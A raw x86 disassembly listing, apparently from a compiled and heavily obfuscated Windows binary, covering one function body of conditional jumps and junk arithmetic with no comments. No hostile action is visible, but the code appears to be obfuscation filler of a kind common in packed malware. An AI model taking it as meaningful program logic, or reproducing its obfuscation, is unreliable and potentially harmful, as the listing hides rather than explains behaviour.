  41aa82:	sub    ecx,edx
  41aa84:	add    ecx,ecx
  41aa86:	or     DWORD PTR [ebp-0x30],esi
  41aa89:	mov    esi,0xa7
  41aa8e:	add    DWORD PTR [ebp-0x30],ecx
  41aa91:	add    edi,eax
  41aa93:	add    edi,esi
  41aa95:	cmp    ecx,0x70fe
  41aa9b:	je     0x41aaea
  41aa9d:	mov    ecx,0x867b
  41aaa2:	mov    eax,DWORD PTR [ebp-0x30]
  41aaa5:	add    edi,esi
  41aaa7:	sub    ecx,ebx
  41aaa9:	and    edi,eax
  41aaab:	and    ecx,eax
  41aaad:	cmp    edi,0xffffffb9
  41aab0:	je     0x41aaea
  41aab2:	cmp    ecx,0xffffffdf
  41aab5:	je     0x41aaea
  41aab7:	mov    eax,DWORD PTR ds:0x4599c8
  41aabd:	mov    esi,DWORD PTR [ebp-0x30]
  41aac0:	sub    DWORD PTR [ebp-0x30],eax
  41aac3:	cmp    edi,0xffffffc8
  41aac6:	je     0x41aaea
  41aac8:	sub    DWORD PTR [ebp-0x30],esi
  41aacb:	mov    eax,0x6c
  41aad0:	add    ecx,edx
  41aad2:	mov    esi,0x47
  41aad7:	sub    eax,ebx
  41aad9:	sub    edi,eax
  41aadb:	add    esi,eax
  41aadd:	mov    DWORD PTR [ebp-0x18],edi
  41aae0:	sub    DWORD PTR [ebp-0x18],ecx
  41aae3:	and    esi,edi
  41aae5:	sub    esi,edi
  41aae7:	and    DWORD PTR [ebp-0x30],esi
  41aaea:	cmp    edi,DWORD PTR [ebp-0x10]
  41aaed:	jne    0x41ab2c
  41aaef:	mov    ecx,DWORD PTR [ebp-0x30]
  41aaf2:	mov    edi,DWORD PTR [ebp-0x30]
  41aaf5:	cmp    edi,DWORD PTR [ebp-0x8]
  41aaf8:	je     0x41ab2c
  41aafa:	mov    esi,DWORD PTR [ebp-0x30]
  41aafd:	add    edi,esi
  41aaff:	sub    ecx,edx
  41ab01:	mov    esi,0x74
  41ab06:	cmp    ecx,DWORD PTR [ebp-0x24]
  41ab09:	jne    0x41ab2c
  41ab0b:	cmp    edi,DWORD PTR [ebp-0x1c]
  41ab0e:	jne    0x41ab2c
  41ab10:	add    esi,ecx
  41ab12:	mov    ecx,0x4c9b
  41ab17:	add    ecx,ecx
  41ab19:	cmp    edi,DWORD PTR [ebp-0x3c]
  41ab1c:	je     0x41ab2c
  41ab1e:	mov    eax,DWORD PTR [ebp-0x30]
  41ab21:	and    DWORD PTR [ebp-0x30],edi
  41ab24:	sub    DWORD PTR [ebp-0x30],ecx
  41ab27:	add    esi,eax
  41ab29:	add    DWORD PTR [ebp-0x30],esi
  41ab2c:	or     ebx,edx
  41ab2e:	mov    edi,DWORD PTR [ebp-0x30]
  41ab31:	mov    ecx,DWORD PTR [ebp-0x30]
  41ab34:	sub    DWORD PTR [ebp-0x30],ecx
  41ab37:	sub    DWORD PTR [ebp-0x30],ebx
  41ab3a:	sub    DWORD PTR [ebp-0x30],edi
  41ab3d:	mov    esi,DWORD PTR [ebp-0x30]
  41ab40:	add    DWORD PTR [ebp-0x30],esi
  41ab43:	and    ebx,edx
  41ab45:	mov    eax,DWORD PTR [ebp-0x30]
  41ab48:	sub    eax,edi
  41ab4a:	mov    ecx,DWORD PTR [ebp-0x30]
  41ab4d:	sub    DWORD PTR [ebp-0x30],ecx
  41ab50:	sub    DWORD PTR [ebp-0x30],ebx
  41ab53:	cmp    eax,0xffffffd1
  41ab56:	jne    0x41ab5b
  41ab58:	add    DWORD PTR [ebp-0x30],eax
  41ab5b:	sub    DWORD PTR [ebp-0x30],edx
  41ab5e:	sub    ebx,edx
  41ab60:	and    esi,edi
  41ab62:	mov    eax,0x303c
  41ab67:	add    eax,esi
  41ab69:	mov    edi,DWORD PTR [ebp-0x30]
  41ab6c:	cmp    esi,DWORD PTR ds:0x459934
  41ab72:	jne    0x41ac7e
  41ab78:	mov    esi,eax
  41ab7a:	cmp    edi,0x59
  41ab7d:	jne    0x41ac7e
  41ab83:	test   edi,0x9
  41ab89:	je     0x41ac7e
  41ab8f:	mov    ecx,DWORD PTR [ebp-0x30]
  41ab92:	cmp    ecx,0x281e
  41ab98:	jne    0x41ac7e
  41ab9e:	mov    edx,DWORD PTR [ebp-0x30]
  41aba1:	cmp    edx,0x41
  41aba4:	jne    0x41ac7e
  41abaa:	mov    eax,ebx
  41abac:	sub    edi,esi
  41abae:	cmp    edi,0xffffffbd
  41abb1:	je     0x41ac7e
  41abb7:	mov    esi,DWORD PTR ds:0x459950
  41abbd:	or     edi,ebx
  41abbf:	add    DWORD PTR [ebp-0x30],ebx
  41abc2:	cmp    ecx,ebx
  41abc4:	jne    0x41ac7e
  41abca:	mov    esi,0x19
  41abcf:	cmp    edi,0x32
  41abd2:	je     0x41ac7e
  41abd8:	sub    DWORD PTR [ebp-0x30],ecx
  41abdb:	mov    ecx,0xa8
  41abe0:	add    ecx,eax
  41abe2:	mov    eax,DWORD PTR [ebp-0x30]
  41abe5:	add    DWORD PTR [ebp-0x30],edx
  41abe8:	add    DWORD PTR [ebp-0x30],ecx
  41abeb:	cmp    edi,0xffffffe2
  41abee:	je     0x41ac7e
  41abf4:	mov    edx,eax
  41abf6:	mov    eax,ecx
  41abf8:	sub    DWORD PTR [ebp-0x30],esi
  41abfb:	cmp    edx,DWORD PTR ds:0x459950
  41ac01:	je     0x41ac7e
  41ac03:	mov    esi,DWORD PTR [ebp-0x30]
  41ac06:	mov    ecx,0xdd
  41ac0b:	cmp    edx,0x1b
  41ac0e:	je     0x41ac7e
  41ac10:	or     DWORD PTR [ebp-0x30],esi
  41ac13:	mov    esi,DWORD PTR [ebp-0x30]
  41ac16:	cmp    edx,DWORD PTR [ebp-0x40]
  41ac19:	jne    0x41ac7e
  41ac1b:	cmp    esi,eax
  41ac1d:	je     0x41ac7e
  41ac1f:	sub    esi,eax
  41ac21:	mov    eax,0xd0
  41ac26:	sub    DWORD PTR [ebp-0x30],edi
  41ac29:	cmp    edx,ebx
  41ac2b:	je     0x41ac7e
  41ac2d:	test   esi,0x2b50
  41ac33:	jne    0x41ac7e
  41ac35:	xor    DWORD PTR [ebp-0x30],ebx
  41ac38:	cmp    esi,0xffffffa3
  41ac3b:	jne    0x41ac7e
  41ac3d:	test   esi,0x48
  41ac43:	je     0x41ac7e
  41ac45:	add    edx,edi
  41ac47:	add    esi,edi
  41ac49:	sub    DWORD PTR [ebp-0x30],edx
  41ac4c:	mov    eax,0x38
  41ac51:	mov    edi,DWORD PTR [ebp-0x30]
  41ac54:	or     DWORD PTR [ebp-0x30],edi
  41ac57:	and    ecx,ebx
  41ac59:	mov    DWORD PTR [ebp-0x30],ecx
  41ac5c:	cmp    esi,0x14
  41ac5f:	jne    0x41ac7e
  41ac61:	cmp    esi,0xffffffc1
  41ac64:	je     0x41ac7e
  41ac66:	cmp    edi,DWORD PTR ds:0x459934
  41ac6c:	jne    0x41ac7e
  41ac6e:	mov    edx,edi
  41ac70:	and    DWORD PTR [ebp-0x30],esi
  41ac73:	mov    ecx,DWORD PTR [ebp-0x30]
  41ac76:	sub    DWORD PTR [ebp-0x30],eax
  41ac79:	add    ecx,edx
  41ac7b:	sub    DWORD PTR [ebp-0x30],ecx
  41ac7e:	xor    DWORD PTR [ebp-0x30],esi
  41ac81:	mov    DWORD PTR [ebp-0x38],ebx
  41ac84:	mov    esi,DWORD PTR [ebp-0x30]
  41ac87:	cmp    esi,eax
  41ac89:	je     0x41ac8e
  41ac8b:	and    DWORD PTR [ebp-0x30],esi
  41ac8e:	sub    edx,edi
  41ac90:	cmp    edx,DWORD PTR ds:0x4599c8
  41ac96:	je     0x41ad2c
  41ac9c:	cmp    edx,0xffffffa6
  41ac9f:	je     0x41ad2c
  41aca5:	add    edx,eax
  41aca7:	sub    edx,esi
  41aca9:	cmp    edi,0xffffffae
  41acac:	je     0x41ad2c
  41acae:	sub    edx,eax
  41acb0:	mov    eax,0xca
  41acb5:	add    eax,ecx
  41acb7:	cmp    edx,esi
  41acb9:	jne    0x41ad2c
  41acbb:	cmp    edx,0x4b
  41acbe:	je     0x41ad2c
  41acc0:	cmp    eax,0xffffffb7
  41acc3:	je     0x41ad2c
  41acc5:	add    eax,edi
  41acc7:	or     DWORD PTR [ebp-0x30],edx
  41acca:	mov    ebx,DWORD PTR [ebp-0x30]
  41accd:	test   eax,0xb6
  41acd2:	jne    0x41ad2c
  41acd4:	cmp    ebx,0x4b
  41acd7:	je     0x41ad2c
  41acd9:	cmp    ebx,0x57
  41acdc:	jne    0x41ad2c
  41acde:	sub    eax,ebx
  41ace0:	mov    ecx,DWORD PTR [ebp-0x30]
  41ace3:	mov    ebx,DWORD PTR [ebp-0x30]
  41ace6:	xor    DWORD PTR [ebp-0x30],ecx
  41ace9:	cmp    esi,DWORD PTR ds:0x4599a4
  41acef:	jne    0x41ad2c
  41acf1:	mov    edx,0x47
  41acf6:	mov    DWORD PTR [ebp-0x30],ebx
  41acf9:	mov    esi,DWORD PTR [ebp-0x30]
  41acfc:	test   esi,0x9714
  41ad02:	jne    0x41ad2c
  41ad04:	cmp    ebx,edi
  41ad06:	jne    0x41ad2c
  41ad08:	and    esi,ecx
  41ad0a:	mov    edx,0x9a
  41ad0f:	xor    DWORD PTR [ebp-0x30],esi
  41ad12:	cmp    eax,0xffffffe6
  41ad15:	je     0x41ad2c
  41ad17:	sub    DWORD PTR [ebp-0x30],edx
  41ad1a:	mov    esi,DWORD PTR [ebp-0x30]
  41ad1d:	cmp    eax,DWORD PTR [ebp-0x3c]
  41ad20:	jne    0x41ad2c
  41ad22:	or     esi,eax
  41ad24:	cmp    ecx,0x18
  41ad27:	je     0x41ad2c
  41ad29:	and    DWORD PTR [ebp-0x30],esi
  41ad2c:	mov    eax,DWORD PTR ds:0x4599b4
  41ad32:	and    eax,edx
  41ad34:	cmp    esi,DWORD PTR [ebp-0x40]
  41ad37:	jne    0x41ad3c
  41ad39:	sub    DWORD PTR [ebp-0x30],eax
  41ad3c:	push   0x5e
  41ad3e:	push   0x0
  41ad40:	call   DWORD PTR ds:0x45a474
  41ad46:	mov    ecx,DWORD PTR [ebp-0x30]
  41ad49:	mov    ebx,DWORD PTR ds:0x4599a4
  41ad4f:	add    ebx,eax
  41ad51:	add    DWORD PTR [ebp-0x30],esi
  41ad54:	and    ebx,ecx
  41ad56:	cmp    ebx,0xa65c
  41ad5c:	je     0x41ad90
  41ad5e:	mov    edi,DWORD PTR ds:0x45994c
  41ad64:	cmp    ebx,0xffffffa0
  41ad67:	je     0x41ad90
  41ad69:	mov    edx,DWORD PTR [ebp-0x30]
  41ad6c:	cmp    edx,DWORD PTR [ebp-0x34]
  41ad6f:	jne    0x41ad90
  41ad71:	add    DWORD PTR [ebp-0x30],edx
  41ad74:	mov    edx,DWORD PTR [ebp-0x30]
  41ad77:	mov    esi,0x8e
  41ad7c:	sub    esi,edx
  41ad7e:	sub    ebx,ecx
  41ad80:	add    DWORD PTR [ebp-0x30],esi
  41ad83:	sub    ebx,edi
  41ad85:	cmp    ebx,DWORD PTR ds:0x4599b4
  41ad8b:	je     0x41ad90
  41ad8d:	mov    DWORD PTR [ebp-0x30],ebx
  41ad90:	cmp    eax,0xffffffbf
  41ad93:	jne    0x41ae77
  41ad99:	cmp    esi,0xffffffc3
  41ad9c:	jne    0x41ada1
  41ad9e:	xor    DWORD PTR [ebp-0x30],esi
  41ada1:	mov    edx,0xa8
  41ada6:	add    DWORD PTR [ebp-0x30],edx
  41ada9:	or     DWORD PTR [ebp-0x30],edx
  41adac:	add    edx,edx
  41adae:	cmp    ecx,ebx
  41adb0:	jne    0x41ae48
  41adb6:	mov    ebx,DWORD PTR [ebp-0x30]
  41adb9:	mov    eax,0x8a
  41adbe:	cmp    ebx,0x7e
  41adc1:	jne    0x41ae48
  41adc7:	mov    ecx,DWORD PTR [ebp-0x30]
  41adca:	mov    esi,0x5c
  41adcf:	and    esi,edi
  41add1:	add    eax,ebx
  41add3:	cmp    eax,DWORD PTR ds:0x4599b4
  41add9:	jne    0x41ae48
  41addb:	add    ecx,ebx
  41addd:	add    ecx,ebx
  41addf:	sub    ecx,edi
  41ade1:	sub    ecx,edx
  41ade3:	add    esi,edx
  41ade5:	sub    DWORD PTR [ebp-0x30],eax
  41ade8:	cmp    ecx,0x4e
  41adeb:	jne    0x41ae48
  41aded:	mov    ebx,DWORD PTR [ebp-0x30]
  41adf0:	cmp    ecx,0x6d
  41adf3:	jne    0x41ae48
  41adf5:	mov    eax,DWORD PTR [ebp-0x30]
  41adf8:	xor    DWORD PTR [ebp-0x30],edx
  41adfb:	cmp    ebx,DWORD PTR ds:0x459950
  41ae01:	jne    0x41ae48
  41ae03:	mov    edi,DWORD PTR [ebp-0x30]
  41ae06:	and    edi,ecx
  41ae08:	test   eax,0xe8
  41ae0d:	je     0x41ae48
  41ae0f:	add    edi,edi
  41ae11:	and    DWORD PTR [ebp-0x30],ebx
  41ae14:	cmp    edi,DWORD PTR [ebp-0x48]
  41ae17:	jne    0x41ae48
  41ae19:	mov    ebx,0x8c
  41ae1e:	mov    esi,0xdf
  41ae23:	add    DWORD PTR [ebp-0x30],edi
  41ae26:	add    DWORD PTR [ebp-0x30],eax
  41ae29:	add    DWORD PTR [ebp-0x30],esi
  41ae2c:	or     ebx,edx
  41ae2e:	cmp    edi,0x6e
  41ae31:	je     0x41ae48
  41ae33:	mov    esi,DWORD PTR [ebp-0x30]
  41ae36:	and    esi,ebx
  41ae38:	mov    ecx,0x8
  41ae3d:	sub    esi,eax
  41ae3f:	add    ecx,esi
  41ae41:	add    ecx,edi
  41ae43:	add    ecx,ecx
  41ae45:	add    DWORD PTR [ebp-0x30],ecx
  41ae48:	add    DWORD PTR [ebp-0x30],ecx
  41ae4b:	add    edx,edx
  41ae4d:	sub    DWORD PTR [ebp-0x30],edx
  41ae50:	and    DWORD PTR [ebp-0x30],eax
  41ae53:	add    edx,edx
  41ae55:	mov    edi,0xa8
  41ae5a:	mov    ebx,DWORD PTR [ebp-0x30]
  41ae5d:	sub    DWORD PTR [ebp-0x30],ebx
  41ae60:	sub    DWORD PTR [ebp-0x30],edi
  41ae63:	mov    eax,0x69
  41ae68:	mov    ecx,edx
  41ae6a:	or     eax,ecx
  41ae6c:	mov    DWORD PTR [ebp-0x30],eax
  41ae6f:	mov    DWORD PTR [ebp-0x44],edx
  41ae72:	and    esi,edi
  41ae74:	add    DWORD PTR [ebp-0x30],esi
  41ae77:	mov    ecx,DWORD PTR [ebp-0x30]
  41ae7a:	sub    ecx,eax
  41ae7c:	xor    DWORD PTR [ebp-0x30],ecx
  41ae7f:	mov    eax,DWORD PTR ds:0x459934
  41ae85:	cmp    ebx,edi
  41ae87:	je     0x41aebb
  41ae89:	mov    esi,DWORD PTR [ebp-0x30]
  41ae8c:	mov    edi,DWORD PTR [ebp-0x30]
  41ae8f:	or     DWORD PTR [ebp-0x30],eax
  41ae92:	add    esi,ecx
  41ae94:	or     edi,ecx
  41ae96:	and    esi,eax
  41ae98:	cmp    ecx,0x9206121
  41ae9e:	jne    0x41aebb
  41aea0:	test   edi,0x550b
  41aea6:	jne    0x41aebb
  41aea8:	and    esi,edx
  41aeaa:	sub    esi,edx
  41aeac:	cmp    esi,DWORD PTR ds:0x4599b4
  41aeb2:	je     0x41aebb
  41aeb4:	or     esi,edi
  41aeb6:	add    esi,ebx
  41aeb8:	sub    DWORD PTR [ebp-0x30],esi
  41aebb:	push   0x4599a4
  41aec0:	call   DWORD PTR ds:0x45a468
  41aec6:	add    ebx,edi
  41aec8:	xor    DWORD PTR [ebp-0x30],ebx
  41aecb:	test   eax,0x1101
  41aed0:	je     0x41b16a
  41aed6:	sub    edi,esi
  41aed8:	or     edi,esi
  41aeda:	mov    DWORD PTR [ebp-0x30],edi
  41aedd:	mov    eax,0x4e
  41aee2:	or     DWORD PTR [ebp-0x30],esi
  41aee5:	mov    esi,DWORD PTR [ebp-0x30]
  41aee8:	cmp    esi,DWORD PTR [ebp-0x10]
  41aeeb:	jne    0x41af57
  41aeed:	cmp    esi,0x38
  41aef0:	jne    0x41af57
  41aef2:	mov    edx,DWORD PTR [ebp-0x30]
  41aef5:	mov    ebx,0x3c
  41aefa:	or     edx,eax
  41aefc:	and    ebx,eax
  41aefe:	and    esi,eax
  41af00:	cmp    edx,DWORD PTR ds:0x459950
  41af06:	je     0x41af57
  41af08:	cmp    edx,edi
  41af0a:	je     0x41af57
  41af0c:	add    DWORD PTR [ebp-0x30],esi
  41af0f:	add    DWORD PTR [ebp-0x30],edx
  41af12:	mov    edi,DWORD PTR [ebp-0x30]
  41af15:	and    edi,ebx
  41af17:	sub    edi,esi
  41af19:	or     edi,eax
  41af1b:	mov    ebx,DWORD PTR [ebp-0x30]
  41af1e:	or     DWORD PTR [ebp-0x30],edi
  41af21:	sub    ebx,edx
  41af23:	test   ebx,0x418
  41af29:	je     0x41af57
  41af2b:	add    ebx,eax
  41af2d:	mov    edx,DWORD PTR [ebp-0x30]
  41af30:	mov    ecx,ebx
  41af32:	add    ecx,ecx
  41af34:	add    ecx,esi
  41af36:	test   ecx,0xc0
  41af3c:	je     0x41af57
  41af3e:	mov    ebx,DWORD PTR [ebp-0x30]
  41af41:	add    ecx,edx
  41af43:	sub    ebx,eax
  41af45:	or     DWORD PTR [ebp-0x30],ecx
  41af48:	mov    esi,DWORD PTR [ebp-0x30]
  41af4b:	or     esi,edx
  41af4d:	add    ebx,edi
  41af4f:	sub    esi,ecx
  41af51:	add    DWORD PTR [ebp-0x30],ebx
  41af54:	sub    DWORD PTR [ebp-0x30],esi
  41af57:	mov    ebx,0x10f6
  41af5c:	mov    ecx,DWORD PTR [ebp-0x30]
  41af5f:	mov    esi,ecx
  41af61:	cmp    edx,0x8f7
  41af67:	jne    0x41b007
  41af6d:	mov    edx,0x7a
  41af72:	sub    esi,ebx
  41af74:	test   edi,0xac
  41af7a:	je     0x41b007
  41af80:	mov    edi,ebx
  41af82:	add    DWORD PTR [ebp-0x30],edx
  41af85:	and    esi,edi
  41af87:	mov    ecx,DWORD PTR [ebp-0x30]
  41af8a:	add    DWORD PTR [ebp-0x30],ecx
  41af8d:	cmp    esi,0xffffffc8
  41af90:	jne    0x41b007
  41af92:	mov    edx,0xa3
  41af97:	mov    edi,DWORD PTR ds:0x459944
  41af9d:	cmp    esi,DWORD PTR [ebp-0x40]
  41afa0:	je     0x41b007
  41afa2:	mov    ecx,DWORD PTR [ebp-0x30]
  41afa5:	add    edx,ebx
  41afa7:	mov    DWORD PTR [ebp-0x30],ecx
  41afaa:	sub    edi,eax
  41afac:	mov    ecx,0x27b1
  41afb1:	and    DWORD PTR [ebp-0x30],edx
  41afb4:	sub    DWORD PTR [ebp-0x30],ecx
  41afb7:	add    edi,edi
  41afb9:	add    esi,edx
  41afbb:	sub    esi,edx
  41afbd:	cmp    esi,edi
  41afbf:	jne    0x41b007
  41afc1:	sub    DWORD PTR [ebp-0x30],ecx
  41afc4:	add    DWORD PTR [ebp-0x30],esi
  41afc7:	mov    ecx,0x7e
  41afcc:	add    DWORD PTR [ebp-0x30],edi
  41afcf:	mov    edi,DWORD PTR [ebp-0x30]
  41afd2:	add    ecx,ebx
  41afd4:	cmp    edi,0xffffffcb
  41afd7:	je     0x41b007
  41afd9:	mov    esi,0xc1
  41afde:	mov    esi,DWORD PTR [ebp-0x30]
  41afe1:	add    DWORD PTR [ebp-0x30],esi
  41afe4:	cmp    edi,DWORD PTR ds:0x4599c8
  41afea:	jne    0x41b007
  41afec:	sub    edi,eax
  41afee:	xor    DWORD PTR [ebp-0x30],edi
  41aff1:	mov    edx,DWORD PTR ds:0x4599c0
  41aff7:	mov    edx,eax
  41aff9:	test   esi,0x1c
  41afff:	je     0x41b004
  41b001:	add    DWORD PTR [ebp-0x30],ecx
  41b004:	and    DWORD PTR [ebp-0x30],edx
  41b007:	add    DWORD PTR [ebp-0x30],esi
  41b00a:	mov    DWORD PTR [ebp-0x48],eax
  41b00d:	and    esi,ebx
  41b00f:	mov    edx,ecx
  41b011:	mov    ecx,DWORD PTR [ebp-0x30]
  41b014:	sub    DWORD PTR [ebp-0x30],esi
  41b017:	xor    DWORD PTR [ebp-0x30],ecx
  41b01a:	add    DWORD PTR [ebp-0x30],esi
  41b01d:	sub    edx,eax
  41b01f:	sub    DWORD PTR [ebp-0x30],edi
  41b022:	sub    DWORD PTR [ebp-0x30],edx
  41b025:	cmp    esi,0x2f52
  41b02b:	je     0x41b04e
  41b02d:	mov    edx,DWORD PTR ds:0x459934
  41b033:	add    edx,ecx
  41b035:	mov    esi,0xc29f
  41b03a:	sub    DWORD PTR [ebp-0x30],esi
  41b03d:	test   edx,0x38
  41b043:	je     0x41b04e
  41b045:	mov    edi,DWORD PTR [ebp-0x30]
  41b048:	xor    DWORD PTR [ebp-0x30],edi
  41b04b:	and    DWORD PTR [ebp-0x30],edx
  41b04e:	add    ebx,ebx
  41b050:	mov    esi,DWORD PTR [ebp-0x30]
  41b053:	mov    ecx,edi
  41b055:	sub    esi,edi
  41b057:	add    esi,ebx
  41b059:	add    DWORD PTR [ebp-0x30],esi
  41b05c:	sub    DWORD PTR [ebp-0x30],ecx
  41b05f:	sub    edi,ebx
  41b061:	add    edi,esi
  41b063:	mov    ecx,0xb00c
  41b068:	mov    esi,DWORD PTR [ebp-0x30]
  41b06b:	add    edi,edx
  41b06d:	cmp    edi,esi
  41b06f:	je     0x41b0bf
  41b071:	sub    edi,esi
  41b073:	add    DWORD PTR [ebp-0x30],ecx
  41b076:	mov    edx,0xb9
  41b07b:	sub    edx,edi
  41b07d:	mov    ecx,0x2a
  41b082:	sub    DWORD PTR [ebp-0x30],ecx
  41b085:	sub    edx,edi
  41b087:	test   edx,0xd
  41b08d:	je     0x41b0bf
  41b08f:	mov    esi,DWORD PTR [ebp-0x30]
  41b092:	mov    edi,esi
  41b094:	sub    edi,eax
  41b096:	add    edi,ecx
  41b098:	cmp    edx,0xffffffad
  41b09b:	jne    0x41b0bf
  41b09d:	mov    ecx,DWORD PTR [ebp-0x30]
  41b0a0:	mov    esi,DWORD PTR [ebp-0x30]
  41b0a3:	cmp    edi,0x74
  41b0a6:	jne    0x41b0bf
  41b0a8:	sub    DWORD PTR [ebp-0x30],edi
  41b0ab:	sub    edx,ecx
  41b0ad:	add    esi,edx
  41b0af:	cmp    esi,0xffffff8f
  41b0b2:	jne    0x41b0bf
  41b0b4:	cmp    esi,0x4d95
  41b0ba:	jne    0x41b0bf
  41b0bc:	xor    DWORD PTR [ebp-0x30],esi
  41b0bf:	add    ebx,eax
  41b0c1:	test   ecx,0xc572
  41b0c7:	je     0x41b0cc
  41b0c9:	or     DWORD PTR [ebp-0x30],edi
  41b0cc:	mov    ecx,0x4c94
  41b0d1:	mov    eax,DWORD PTR [ebp-0x30]
  41b0d4:	sub    eax,edx
  41b0d6:	cmp    edi,0xffffffcd
  41b0d9:	jne    0x41b161
  41b0df:	sub    ecx,esi
  41b0e1:	mov    edi,esi
  41b0e3:	sub    DWORD PTR [ebp-0x30],edi
  41b0e6:	mov    esi,DWORD PTR [ebp-0x30]
  41b0e9:	and    eax,ecx
  41b0eb:	test   eax,0xb6
  41b0f0:	jne    0x41b161
  41b0f2:	mov    edi,DWORD PTR [ebp-0x30]
  41b0f5:	and    edi,esi
  41b0f7:	mov    edx,DWORD PTR [ebp-0x30]
  41b0fa:	add    DWORD PTR [ebp-0x30],eax
  41b0fd:	cmp    edx,DWORD PTR [ebp-0x34]
  41b100:	jne    0x41b161
  41b102:	and    DWORD PTR [ebp-0x30],edx
  41b105:	sub    edi,esi
  41b107:	mov    eax,DWORD PTR ds:0x4599c8
  41b10d:	cmp    edi,DWORD PTR ds:0x4599c0
  41b113:	jne    0x41b161
  41b115:	mov    DWORD PTR [ebp-0x30],esi
  41b118:	add    edi,edi
  41b11a:	add    DWORD PTR [ebp-0x30],edi
  41b11d:	sub    eax,edx
  41b11f:	mov    edx,DWORD PTR [ebp-0x30]
  41b122:	cmp    edx,0xd
  41b125:	je     0x41b161
  41b127:	cmp    eax,edi
  41b129:	jne    0x41b161
  41b12b:	mov    edi,0xa6
  41b130:	sub    edi,eax
  41b132:	mov    eax,DWORD PTR ds:0x45999c
  41b138:	add    edi,edx
  41b13a:	add    edi,ecx
  41b13c:	sub    DWORD PTR [ebp-0x30],edi
  41b13f:	sub    eax,edi
  41b141:	cmp    eax,DWORD PTR ds:0x459950
  41b147:	je     0x41b161
  41b149:	cmp    eax,DWORD PTR ds:0x4599b4
  41b14f:	jne    0x41b161
  41b151:	cmp    esi,DWORD PTR [ebp-0x38]
  41b154:	jne    0x41b161
  41b156:	cmp    eax,ebx
  41b158:	je     0x41b161
  41b15a:	mov    ecx,eax
  41b15c:	add    ecx,eax
  41b15e:	and    DWORD PTR [ebp-0x30],ecx
  41b161:	sub    DWORD PTR [ebp-0x48],ebx
  41b164:	mov    esi,DWORD PTR [ebp-0x30]
  41b167:	sub    DWORD PTR [ebp-0x30],esi
  41b16a:	cmp    edx,0xffffffb9
  41b16d:	je     0x41b1ad
  41b16f:	add    ecx,edi
  41b171:	mov    edi,DWORD PTR [ebp-0x30]
  41b174:	add    DWORD PTR [ebp-0x30],edi
  41b177:	mov    edx,esi
  41b179:	cmp    ecx,0xffffffd0
  41b17c:	je     0x41b1ad
  41b17e:	xor    DWORD PTR [ebp-0x30],ecx
  41b181:	add    DWORD PTR [ebp-0x30],ecx
  41b184:	cmp    eax,0xffffffba
  41b187:	je     0x41b1ad
  41b189:	and    DWORD PTR [ebp-0x30],esi
  41b18c:	mov    esi,DWORD PTR [ebp-0x30]
  41b18f:	sub    edx,esi
  41b191:	mov    ebx,DWORD PTR [ebp-0x30]
  41b194:	cmp    edx,ecx
  41b196:	je     0x41b1ad
  41b198:	mov    edi,0x1b
  41b19d:	and    edx,ebx
  41b19f:	mov    ebx,DWORD PTR ds:0x45994c
  41b1a5:	and    ebx,edi
  41b1a7:	add    DWORD PTR [ebp-0x30],edx
  41b1aa:	add    DWORD PTR [ebp-0x30],ebx
  41b1ad:	add    ecx,eax
  41b1af:	mov    eax,DWORD PTR [ebp-0x30]
  41b1b2:	sub    DWORD PTR [ebp-0x30],eax
  41b1b5:	mov    edx,DWORD PTR [ebp-0x30]
  41b1b8:	add    DWORD PTR [ebp-0x30],ecx
  41b1bb:	or     edx,ebx
  41b1bd:	sub    edx,eax
  41b1bf:	cmp    edx,0xffffff84
  41b1c2:	jne    0x41b243
  41b1c4:	mov    esi,ecx
  41b1c6:	add    esi,esi
  41b1c8:	add    DWORD PTR [ebp-0x30],ecx
  41b1cb:	mov    ecx,DWORD PTR [ebp-0x30]
  41b1ce:	add    edx,ebx
  41b1d0:	sub    DWORD PTR [ebp-0x30],ecx
  41b1d3:	cmp    edx,0xd4c1
  41b1d9:	jne    0x41b243
  41b1db:	mov    ecx,0x80240304
  41b1e0:	mov    edi,DWORD PTR [ebp-0x30]
  41b1e3:	add    DWORD PTR [ebp-0x30],ecx
  41b1e6:	sub    edi,eax
  41b1e8:	cmp    edi,0x805d149
  41b1ee:	jne    0x41b243
  41b1f0:	test   esi,0x49
  41b1f6:	je     0x41b243
  41b1f8:	mov    ebx,DWORD PTR ds:0x4599a4
  41b1fe:	mov    DWORD PTR [ebp-0x30],edx
  41b201:	cmp    esi,DWORD PTR ds:0x4599b4
  41b207:	je     0x41b243
  41b209:	mov    ecx,DWORD PTR [ebp-0x30]
  41b20c:	sub    DWORD PTR [ebp-0x30],ebx
  41b20f:	mov    eax,DWORD PTR [ebp-0x30]
  41b212:	cmp    eax,DWORD PTR [ebp-0x40]
  41b215:	jne    0x41b243
  41b217:	mov    edx,0xd4
  41b21c:	sub    esi,ebx
  41b21e:	mov    ebx,0x2a
  41b223:	sub    ecx,ebx
  41b225:	add    eax,edi
  41b227:	sub    eax,ecx
  41b229:	add    eax,edx
  41b22b:	cmp    esi,ebx
  41b22d:	jne    0x41b243
  41b22f:	mov    ebx,esi
  41b231:	mov    edx,DWORD PTR [ebp-0x30]
  41b234:	add    DWORD PTR [ebp-0x30],eax
  41b237:	add    ebx,esi
  41b239:	or     DWORD PTR [ebp-0x30],edx
  41b23c:	cmp    ebx,ecx
  41b23e:	jne    0x41b243
  41b240:	add    DWORD PTR [ebp-0x30],ebx
  41b243:	mov    ecx,DWORD PTR ds:0x459934
  41b249:	and    DWORD PTR [ebp-0x30],ecx
  41b24c:	mov    ebx,DWORD PTR [ebp-0x30]
  41b24f:	add    DWORD PTR [ebp-0x30],edx
  41b252:	or     ebx,edi
  41b254:	mov    edx,DWORD PTR ds:0x459970
  41b25a:	add    edx,esi
  41b25c:	cmp    ebx,0x62
  41b25f:	jne    0x41b2a2
  41b261:	sub    ebx,edi
  41b263:	add    edx,eax
  41b265:	and    edx,ecx
  41b267:	sub    ebx,eax
  41b269:	mov    eax,DWORD PTR [ebp-0x30]
  41b26c:	mov    DWORD PTR [ebp-0x54],esi
  41b26f:	mov    edi,DWORD PTR ds:0x459950
  41b275:	sub    edx,eax
  41b277:	add    edx,eax
  41b279:	and    edi,edx
  41b27b:	or     ebx,edx
  41b27d:	test   ebx,0x98
  41b283:	jne    0x41b2a2
  41b285:	add    edi,edx
  41b287:	mov    ecx,DWORD PTR ds:0x45992c
  41b28d:	or     ecx,ebx
  41b28f:	add    DWORD PTR [ebp-0x30],ecx
  41b292:	mov    ebx,DWORD PTR [ebp-0x30]
  41b295:	and    edi,ecx
  41b297:	and    ebx,edx
  41b299:	add    DWORD PTR [ebp-0x54],edx
  41b29c:	and    DWORD PTR [ebp-0x54],edi
  41b29f:	sub    DWORD PTR [ebp-0x54],ebx
  41b2a2:	or     eax,edx
  41b2a4:	mov    edx,0x88
  41b2a9:	mov    esi,eax
